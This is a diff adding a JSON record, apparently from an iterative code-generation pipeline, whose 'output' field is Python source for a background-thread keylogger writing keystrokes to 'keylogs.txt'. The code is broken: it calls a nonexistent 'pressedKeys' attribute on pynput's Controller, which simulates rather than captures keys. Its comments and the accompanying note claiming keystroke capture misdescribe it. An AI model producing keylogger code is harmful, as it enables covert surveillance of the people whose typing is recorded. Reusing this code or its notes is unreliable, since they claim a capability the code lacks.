@@ -1,0 +1,8 @@
+{
+  "output": "\n# All libraries necessary for the code below\nimport time         # Libraries necessary to work with time\nimport threading      # Necessary for running code in background\nfrom pynput.keyboard import Controller  # Python library used to access keyboard input\n\nv = 'keylogs.txt'\nk = open(v, 'a')\n\ndef keylog():\n    kb = Controller()\n    startTime = time.time()\n    while True:\n        timeElapsed = round((time.time() - startTime) * 1000)\n        if timeElapsed > 0:\n            key_pressed = kb.pressedKeys[::-1]\n            keypress = key_pressed[0]\n\n            # Write each key to log.txt\n            k.write(f'{keypress} ')\n            if keypress == 't':\n                break\n\n        time.sleep(0)\n\nstartTime_thr = threading.Thread(target=keylog)\nstartTime_thr.start()",
+  "notes": "Added 'pynput' library for capturing keystrokes in a background process.",
+  "applied_fixes": [
+    "iteration8_issue1"
+  ],
+  "iterations": 9
+}
